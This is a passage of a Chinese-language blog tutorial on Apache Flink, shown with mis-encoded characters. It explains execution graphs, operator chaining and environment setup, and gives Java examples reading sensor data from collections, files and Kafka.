åˆ©ç”¨å„ç§ç®—å­è¿›è¡Œå¤„ç†åŠ å·¥ï¼ŒSink è´Ÿè´£è¾“å‡º </li></ul><p><img src="https://img-blog.csdnimg.cn/20200524220037630.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=urxeo&originHeight=240&originWidth=643&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> åœ¨è¿è¡Œæ—¶ï¼ŒFlinkä¸Šè¿è¡Œçš„ç¨‹åºä¼šè¢«æ˜ å°„æˆâ€œé€»è¾‘æ•°æ®æµâ€ï¼ˆdataflowsï¼‰ï¼Œå®ƒåŒ…å«äº†è¿™ä¸‰éƒ¨åˆ† </li><li> æ¯ä¸€ä¸ªdataflowä»¥ä¸€ä¸ªæˆ–å¤šä¸ªsourceså¼€å§‹ä»¥ä¸€ä¸ªæˆ–å¤šä¸ªsinksç»“æŸã€‚dataflowç±»ä¼¼äºä»»æ„çš„æœ‰å‘æ— ç¯å›¾ï¼ˆDAGï¼‰ </li><li> åœ¨å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œç¨‹åºä¸­çš„è½¬æ¢è¿ç®—ï¼ˆtransformationsï¼‰è·Ÿdataflowä¸­çš„ç®—å­ï¼ˆoperatorï¼‰æ˜¯ä¸€ä¸€å¯¹åº”çš„å…³ç³» </li></ul><h5 id="æ‰§è¡Œå›¾ï¼ˆExecutionGraphï¼‰"><a href="#æ‰§è¡Œå›¾ï¼ˆExecutionGraphï¼‰" class="headerlink" title="æ‰§è¡Œå›¾ï¼ˆExecutionGraphï¼‰"></a>æ‰§è¡Œå›¾ï¼ˆ<strong>ExecutionGraph</strong>ï¼‰</h5><pre><code>ç”±Flinkç¨‹åºç›´æ¥æ˜ å°„æˆçš„æ•°æ®æµå›¾æ˜¯StreamGraphï¼Œä¹Ÿè¢«ç§°ä¸º**é€»è¾‘æµå›¾**ï¼Œå› ä¸ºå®ƒä»¬è¡¨ç¤ºçš„æ˜¯è®¡ç®—é€»è¾‘çš„é«˜çº§è§†å›¾ã€‚ä¸ºäº†æ‰§è¡Œä¸€ä¸ªæµå¤„ç†ç¨‹åºï¼ŒFlinkéœ€è¦å°†**é€»è¾‘æµå›¾**è½¬æ¢ä¸º**ç‰©ç†æ•°æ®æµå›¾**ï¼ˆä¹Ÿå«**æ‰§è¡Œå›¾**ï¼‰ï¼Œè¯¦ç»†è¯´æ˜ç¨‹åºçš„æ‰§è¡Œæ–¹å¼ã€‚</code></pre><ul><li>Flink ä¸­çš„æ‰§è¡Œå›¾å¯ä»¥åˆ†æˆå››å±‚ï¼šStreamGraph -&gt; JobGraph -&gt; ExecutionGraph -&gt; ç‰©ç†æ‰§è¡Œå›¾ã€‚ <ul><li> <strong>StreamGraph</strong>ï¼šæ˜¯æ ¹æ®ç”¨æˆ·é€šè¿‡Stream API ç¼–å†™çš„ä»£ç ç”Ÿæˆçš„æœ€åˆçš„å›¾ã€‚ç”¨æ¥è¡¨ç¤ºç¨‹åºçš„æ‹“æ‰‘ç»“æ„ã€‚ </li><li> <strong>JobGraph</strong>ï¼šStreamGraphç»è¿‡ä¼˜åŒ–åç”Ÿæˆäº†JobGraphï¼Œæäº¤ç»™JobManager çš„æ•°æ®ç»“æ„ã€‚ä¸»è¦çš„ä¼˜åŒ–ä¸ºï¼Œå°†å¤šä¸ªç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹chain åœ¨ä¸€èµ·ä½œä¸ºä¸€ä¸ªèŠ‚ç‚¹ï¼Œè¿™æ ·å¯ä»¥å‡å°‘æ•°æ®åœ¨èŠ‚ç‚¹ä¹‹é—´æµåŠ¨æ‰€éœ€è¦çš„åºåˆ—åŒ–/ååºåˆ—åŒ–/ä¼ è¾“æ¶ˆè€—ã€‚ </li><li> <strong>ExecutionGraph</strong>ï¼šJobManager æ ¹æ®JobGraph ç”ŸæˆExecutionGraphã€‚ExecutionGraphæ˜¯JobGraphçš„å¹¶è¡ŒåŒ–ç‰ˆæœ¬ï¼Œæ˜¯è°ƒåº¦å±‚æœ€æ ¸å¿ƒçš„æ•°æ®ç»“æ„ã€‚ </li><li> ç‰©ç†æ‰§è¡Œå›¾ï¼šJobManager æ ¹æ®ExecutionGraph å¯¹Job è¿›è¡Œè°ƒåº¦åï¼Œåœ¨å„ä¸ªTaskManager ä¸Šéƒ¨ç½²Task åå½¢æˆçš„â€œå›¾â€ï¼Œå¹¶ä¸æ˜¯ä¸€ä¸ªå…·ä½“çš„æ•°æ®ç»“æ„ã€‚ </li></ul></li></ul><p><img src="https://img-blog.csdnimg.cn/20200524220232635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=w1FC1&originHeight=605&originWidth=620&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="æ•°æ®ä¼ è¾“å½¢å¼"><a href="#æ•°æ®ä¼ è¾“å½¢å¼" class="headerlink" title="æ•°æ®ä¼ è¾“å½¢å¼"></a>æ•°æ®ä¼ è¾“å½¢å¼</h5><ul><li> ä¸€ä¸ªç¨‹åºä¸­ï¼Œä¸åŒçš„ç®—å­å¯èƒ½å…·æœ‰ä¸åŒçš„å¹¶è¡Œåº¦ </li><li>ç®—å­ä¹‹é—´ä¼ è¾“æ•°æ®çš„å½¢å¼å¯ä»¥æ˜¯ one-to-one (forwarding) çš„æ¨¡å¼ä¹Ÿå¯ä»¥æ˜¯redistributing çš„æ¨¡å¼ï¼Œå…·ä½“æ˜¯å“ªä¸€ç§å½¢å¼ï¼Œå–å†³äºç®—å­çš„ç§ç±» <ul><li> <strong>One-to-one</strong>ï¼šstreamç»´æŠ¤ç€åˆ†åŒºä»¥åŠå…ƒç´ çš„é¡ºåºï¼ˆæ¯”å¦‚sourceå’Œmapä¹‹é—´ï¼‰ã€‚è¿™æ„å‘³ç€map ç®—å­çš„å­ä»»åŠ¡çœ‹åˆ°çš„å…ƒç´ çš„ä¸ªæ•°ä»¥åŠé¡ºåºè·Ÿ source ç®—å­çš„å­ä»»åŠ¡ç”Ÿäº§çš„å…ƒç´ çš„ä¸ªæ•°ã€é¡ºåºç›¸åŒã€‚<strong>mapã€fliterã€flatMapç­‰ç®—å­éƒ½æ˜¯one-to-oneçš„å¯¹åº”å…³ç³»</strong>ã€‚ </li><li> <strong>Redistributing</strong>ï¼šstreamçš„åˆ†åŒºä¼šå‘ç”Ÿæ”¹å˜ã€‚æ¯ä¸€ä¸ªç®—å­çš„å­ä»»åŠ¡ä¾æ®æ‰€é€‰æ‹©çš„transformationå‘é€æ•°æ®åˆ°ä¸åŒçš„ç›®æ ‡ä»»åŠ¡ã€‚ä¾‹å¦‚ï¼ŒkeyBy åŸºäº hashCode é‡åˆ†åŒºã€è€Œ broadcast å’Œ rebalance ä¼šéšæœºé‡æ–°åˆ†åŒºï¼Œè¿™äº›ç®—å­éƒ½ä¼šå¼•èµ·redistributeè¿‡ç¨‹ï¼Œè€Œ redistribute è¿‡ç¨‹å°±ç±»ä¼¼äº Spark ä¸­çš„ shuffle è¿‡ç¨‹ã€‚ </li></ul></li></ul><h5 id="ä»»åŠ¡é“¾ï¼ˆOperatorChainsï¼‰"><a href="#ä»»åŠ¡é“¾ï¼ˆOperatorChainsï¼‰" class="headerlink" title="ä»»åŠ¡é“¾ï¼ˆOperatorChainsï¼‰"></a>ä»»åŠ¡é“¾ï¼ˆOperatorChainsï¼‰</h5><pre><code>Flink é‡‡ç”¨äº†ä¸€ç§ç§°ä¸ºä»»åŠ¡é“¾çš„ä¼˜åŒ–æŠ€æœ¯ï¼Œå¯ä»¥åœ¨ç‰¹å®šæ¡ä»¶ä¸‹å‡å°‘æœ¬åœ°é€šä¿¡çš„å¼€é”€ã€‚ä¸ºäº†æ»¡è¶³ä»»åŠ¡é“¾çš„è¦æ±‚ï¼Œå¿…é¡»å°†ä¸¤ä¸ªæˆ–å¤šä¸ªç®—å­è®¾ä¸º**ç›¸åŒçš„å¹¶è¡Œåº¦**ï¼Œå¹¶é€šè¿‡æœ¬åœ°è½¬å‘ï¼ˆlocal forwardï¼‰çš„æ–¹å¼è¿›è¡Œè¿æ¥</code></pre><ul><li><strong>ç›¸åŒå¹¶è¡Œåº¦</strong>çš„ <strong>one-to-one æ“ä½œ</strong>ï¼ŒFlink è¿™æ ·ç›¸è¿çš„ç®—å­é“¾æ¥åœ¨ä¸€èµ·å½¢æˆä¸€ä¸ª taskï¼ŒåŸæ¥çš„ç®—å­æˆä¸ºé‡Œé¢çš„ subtask <ul><li>å¹¶è¡Œåº¦ç›¸åŒã€å¹¶ä¸”æ˜¯ one-to-one æ“ä½œï¼Œä¸¤ä¸ªæ¡ä»¶ç¼ºä¸€ä¸å¯</li></ul></li></ul><pre><code>**ä¸ºä»€ä¹ˆéœ€è¦å¹¶è¡Œåº¦ç›¸åŒï¼Œå› ä¸ºè‹¥flatMapå¹¶è¡Œåº¦ä¸º1ï¼Œåˆ°äº†ä¹‹åçš„mapå¹¶è¡Œåº¦ä¸º2ï¼Œä»flatMapåˆ°mapçš„æ•°æ®æ¶‰åŠåˆ°æ•°æ®ç”±äºå¹¶è¡Œåº¦mapä¸º2ä¼šå¾€ä¸¤ä¸ªslotå¤„ç†ï¼Œæ•°æ®ä¼šåˆ†æ•£ï¼Œæ‰€äº§ç”Ÿçš„å…ƒç´ ä¸ªæ•°å’Œé¡ºåºå‘ç”Ÿçš„æ”¹å˜æ‰€ä»¥æœ‰2ä¸ªå•ç‹¬çš„taskï¼Œä¸èƒ½æˆä¸ºä»»åŠ¡é“¾**</code></pre><p><img src="https://img-blog.csdnimg.cn/20200524220815415.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=aOXT7&originHeight=509&originWidth=620&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>**å¦‚æœå‰åä»»åŠ¡é€»è¾‘ä¸Šå¯ä»¥æ˜¯OneToOneï¼Œä¸”å¹¶è¡Œåº¦ä¸€è‡´ï¼Œé‚£ä¹ˆå°±èƒ½åˆå¹¶åœ¨ä¸€ä¸ªSloté‡Œ**ï¼ˆå¹¶è¡Œåº¦åŸæœ¬æ˜¯å¤šå°‘å°±æ˜¯å¤šå°‘ï¼Œä¸¤è€…å¹¶è¡Œåº¦ä¸€è‡´ï¼‰æ‰§è¡Œã€‚</code></pre><ul><li>keyByéœ€è¦æ ¹æ®Hashå€¼åˆ†é…ç»™ä¸åŒslotæ‰§è¡Œï¼Œæ‰€ä»¥åªèƒ½Hashï¼Œä¸èƒ½OneToOneã€‚</li><li>é€»è¾‘ä¸Šå¯OneToOneä½†æ˜¯å¹¶è¡Œåº¦ä¸åŒï¼Œé‚£ä¹ˆå°±ä¼šRebalanceï¼Œè½®è¯¢å½¢å¼åˆ†é…ç»™ä¸‹ä¸€ä¸ªä»»åŠ¡çš„å¤šä¸ªslotã€‚</li></ul><hr><ul><li> <strong>ä»£ç ä¸­å¦‚æœ</strong><code>**ç®—å­.disableChaining()**</code><strong>ï¼Œèƒ½å¤Ÿå¼ºåˆ¶å½“å‰ç®—å­çš„å­ä»»åŠ¡ä¸å‚ä¸ä»»åŠ¡é“¾çš„åˆå¹¶ï¼Œå³ä¸å’Œå…¶ä»–Slotèµ„æºåˆå¹¶ï¼Œä½†æ˜¯ä»ç„¶å¯ä»¥ä¿ç•™â€œSlotå…±äº«â€çš„ç‰¹æ€§</strong>ã€‚ </li><li> <strong>å¦‚æœ</strong><code>**StreamExecutionEnvironment env.disableOperatorChaining()**</code><strong>åˆ™å½“å‰æ‰§è¡Œç¯å¢ƒå…¨å±€è®¾ç½®ç®—å­ä¸å‚ä¸â€ä»»åŠ¡é“¾çš„åˆå¹¶â€ã€‚</strong> </li><li> <strong>å¦‚æœ</strong><code>**ç®—å­.startNewChain()**</code><strong>è¡¨ç¤ºä¸ç®¡å‰é¢ä»»åŠ¡é“¾åˆå¹¶ä¸å¦ï¼Œä»å½“å‰ç®—å­å¾€åé‡æ–°è®¡ç®—ä»»åŠ¡é“¾çš„åˆå¹¶ã€‚é€šå¸¸ç”¨äºå‰é¢å¼ºåˆ¶ä¸è¦ä»»åŠ¡é“¾åˆå¹¶ï¼Œè€Œå½“å‰å¾€ååˆéœ€è¦ä»»åŠ¡é“¾åˆå¹¶çš„ç‰¹æ®Šåœºæ™¯ã€‚</strong> </li></ul><p><em>psï¼šå¦‚æœ</em><code>_ç®—å­.shuffle()_</code><em>ï¼Œèƒ½å¤Ÿå¼ºåˆ¶ç®—å­ä¹‹åé‡åˆ†åŒºåˆ°ä¸åŒslotæ‰§è¡Œä¸‹ä¸€ä¸ªç®—å­æ“ä½œï¼Œé€»è¾‘ä¸Šä¹Ÿå®ç°äº†ä»»åŠ¡ä¸å‚ä¸ä»»åŠ¡é“¾åˆå¹¶=&gt;ä½†æ˜¯ä»…ä¸ºâ€œä¸å‚ä¸ä»»åŠ¡é“¾çš„åˆå¹¶â€ï¼Œè¿™ä¸ªæ˜æ˜¾ä¸æ˜¯æœ€ä¼˜è§£æ“ä½œ</em></p><blockquote><p><a href="https://blog.csdn.net/qq_31866793/article/details/102786249">Flink slotSharingGroup disableChain startNewChain ç”¨æ³•æ¡ˆä¾‹</a></p></blockquote><h3 id="Flinkæµå¤„ç†API"><a href="#Flinkæµå¤„ç†API" class="headerlink" title="Flinkæµå¤„ç†API"></a>Flinkæµå¤„ç†API</h3><h4 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h4><p><img src="https://img-blog.csdnimg.cn/20191124113558631.png###id=dVDF7&originHeight=113&originWidth=554&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="getExecutionEnvironment"><a href="#getExecutionEnvironment" class="headerlink" title="getExecutionEnvironment"></a>getExecutionEnvironment</h5><pre><code>åˆ›å»ºä¸€ä¸ªæ‰§è¡Œç¯å¢ƒï¼Œè¡¨ç¤ºå½“å‰æ‰§è¡Œç¨‹åºçš„ä¸Šä¸‹æ–‡ã€‚å¦‚æœç¨‹åºæ˜¯ç‹¬ç«‹è°ƒç”¨çš„ï¼Œåˆ™æ­¤æ–¹æ³•è¿”å›æœ¬åœ°æ‰§è¡Œç¯å¢ƒï¼›å¦‚æœä»å‘½ä»¤è¡Œå®¢æˆ·ç«¯è°ƒç”¨ç¨‹åºä»¥æäº¤åˆ°é›†ç¾¤ï¼Œåˆ™æ­¤æ–¹æ³•è¿”å›æ­¤é›†ç¾¤çš„æ‰§è¡Œç¯å¢ƒï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒgetExecutionEnvironmentä¼šæ ¹æ®æŸ¥è¯¢è¿è¡Œçš„æ–¹å¼å†³å®šè¿”å›ä»€ä¹ˆæ ·çš„è¿è¡Œç¯å¢ƒï¼Œæ˜¯æœ€å¸¸ç”¨çš„ä¸€ç§åˆ›å»ºæ‰§è¡Œç¯å¢ƒçš„æ–¹å¼ã€‚</code></pre><p><code>ExecutionEnvironment env = ExecutionEnvironment.*getExecutionEnvironment*();</code></p><p><code>StreamExecutionEnvironment env = StreamExecutionEnvironment.*getExecutionEnvironment*();</code></p><p>å¦‚æœæ²¡æœ‰è®¾ç½®å¹¶è¡Œåº¦ï¼Œä¼šä»¥flink-conf.yamlä¸­çš„é…ç½®ä¸ºå‡†ï¼Œé»˜è®¤æ˜¯1ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20191124113636435.png###id=PeCMw&originHeight=57&originWidth=554&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="createLocalEnvironment"><a href="#createLocalEnvironment" class="headerlink" title="createLocalEnvironment"></a>createLocalEnvironment</h5><pre><code>è¿”å›æœ¬åœ°æ‰§è¡Œç¯å¢ƒï¼Œéœ€è¦åœ¨è°ƒç”¨æ—¶æŒ‡å®šé»˜è®¤çš„å¹¶è¡Œåº¦ã€‚</code></pre><p><code>LocalStreamEnvironment env = StreamExecutionEnvironment.*createLocalEnvironment*(1);</code></p><h5 id="createRemoteEnvironment"><a href="#createRemoteEnvironment" class="headerlink" title="createRemoteEnvironment"></a>createRemoteEnvironment</h5><pre><code>è¿”å›é›†ç¾¤æ‰§è¡Œç¯å¢ƒï¼Œå°†Jaræäº¤åˆ°è¿œç¨‹æœåŠ¡å™¨ã€‚éœ€è¦åœ¨è°ƒç”¨æ—¶æŒ‡å®šJobManagerçš„IPå’Œç«¯å£å·ï¼Œå¹¶æŒ‡å®šè¦åœ¨é›†ç¾¤ä¸­è¿è¡Œçš„JaråŒ…ã€‚</code></pre><p><code>StreamExecutionEnvironment env = StreamExecutionEnvironment.createLocalEnvironment(1);</code></p><h4 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h4><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106335725">Flink-Environmentçš„ä¸‰ç§æ–¹å¼å’ŒSourceçš„å››ç§è¯»å–æ–¹å¼-ä»é›†åˆä¸­ã€ä»kafkaä¸­ã€ä»æ–‡ä»¶ä¸­ã€è‡ªå®šä¹‰</a></p></blockquote><h5 id="ä»é›†åˆè¯»å–æ•°æ®"><a href="#ä»é›†åˆè¯»å–æ•°æ®" class="headerlink" title="ä»é›†åˆè¯»å–æ•°æ®"></a>ä»é›†åˆè¯»å–æ•°æ®</h5><p>javaä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.source;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/1/31 5:13 PM</span></span><br><span class="line"><span class="comment"> * æµ‹è¯•Flinkä»é›†åˆä¸­è·å–æ•°æ®</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SourceTest1_Collection</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è®¾ç½®envå¹¶è¡Œåº¦1ï¼Œä½¿å¾—æ•´ä¸ªä»»åŠ¡æŠ¢å åŒä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œ</span></span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Source: ä»é›†åˆCollectionä¸­è·å–æ•°æ®</span></span><br><span class="line">        DataStream&lt;SensorReading&gt; dataStream = env.fromCollection(</span><br><span class="line">                Arrays.asList(</span><br><span class="line">                        <span class="keyword">new</span> SensorReading(<span class="string">&quot;sensor_1&quot;</span>, <span class="number">1547718199L</span>, <span class="number">35.8</span>),</span><br><span class="line">                        <span class="keyword">new</span> SensorReading(<span class="string">&quot;sensor_6&quot;</span>, <span class="number">1547718201L</span>, <span class="number">15.4</span>),</span><br><span class="line">                        <span class="keyword">new</span> SensorReading(<span class="string">&quot;sensor_7&quot;</span>, <span class="number">1547718202L</span>, <span class="number">6.7</span>),</span><br><span class="line">                        <span class="keyword">new</span> SensorReading(<span class="string">&quot;sensor_10&quot;</span>, <span class="number">1547718205L</span>, <span class="number">38.1</span>)</span><br><span class="line">                )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        DataStream&lt;Integer&gt; intStream = env.fromElements(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ‰“å°è¾“å‡º</span></span><br><span class="line">        dataStream.print(<span class="string">&quot;SENSOR&quot;</span>);</span><br><span class="line">        intStream.print(<span class="string">&quot;INT&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ‰§è¡Œ</span></span><br><span class="line">        env.execute(<span class="string">&quot;JobName&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">INT&gt;</span><span class="bash"> 1</span></span><br><span class="line"><span class="meta">INT&gt;</span><span class="bash"> 2</span></span><br><span class="line"><span class="meta">SENSOR&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_1&#x27;</span>, timestamp=1547718199, temperature=35.8&#125;</span></span><br><span class="line"><span class="meta">INT&gt;</span><span class="bash"> 3</span></span><br><span class="line"><span class="meta">SENSOR&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_6&#x27;</span>, timestamp=1547718201, temperature=15.4&#125;</span></span><br><span class="line"><span class="meta">INT&gt;</span><span class="bash"> 4</span></span><br><span class="line"><span class="meta">SENSOR&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_7&#x27;</span>, timestamp=1547718202, temperature=6.7&#125;</span></span><br><span class="line"><span class="meta">INT&gt;</span><span class="bash"> 5</span></span><br><span class="line"><span class="meta">SENSOR&gt;</span><span class="bash"> SensorReading&#123;id=<span class="string">&#x27;sensor_10&#x27;</span>, timestamp=1547718205, temperature=38.1&#125;</span></span><br><span class="line"><span class="meta">INT&gt;</span><span class="bash"> 6</span></span><br><span class="line"><span class="meta">INT&gt;</span><span class="bash"> 7</span></span><br><span class="line"><span class="meta">INT&gt;</span><span class="bash"> 8</span></span><br><span class="line"><span class="meta">INT&gt;</span><span class="bash"> 9</span></span><br></pre></td></tr></table></figure><h5 id="ä»æ–‡ä»¶è¯»å–æ•°æ®"><a href="#ä»æ–‡ä»¶è¯»å–æ•°æ®" class="headerlink" title="ä»æ–‡ä»¶è¯»å–æ•°æ®"></a>ä»æ–‡ä»¶è¯»å–æ•°æ®</h5><p>javaä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.source;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/1/31 5:26 PM</span></span><br><span class="line"><span class="comment"> * Flinkä»æ–‡ä»¶ä¸­è·å–æ•°æ®</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SourceTest2_File</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½¿å¾—ä»»åŠ¡æŠ¢å åŒä¸€ä¸ªçº¿ç¨‹</span></span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»æ–‡ä»¶ä¸­è·å–æ•°æ®è¾“å‡º</span></span><br><span class="line">        DataStream&lt;String&gt; dataStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        dataStream.print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sensor.txtæ–‡ä»¶å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_1,1547718209,32.8</span><br><span class="line">sensor_1,1547718212,37.1</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_1,1547718209,32.8</span><br><span class="line">sensor_1,1547718212,37.1</span><br></pre></td></tr></table></figure><h5 id="ä»Kafkaè¯»å–æ•°æ®"><a href="#ä»Kafkaè¯»å–æ•°æ®" class="headerlink" title="ä»Kafkaè¯»å–æ•°æ®"></a>ä»Kafkaè¯»å–æ•°æ®</h5><ol><li><p> pomä¾èµ–  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span 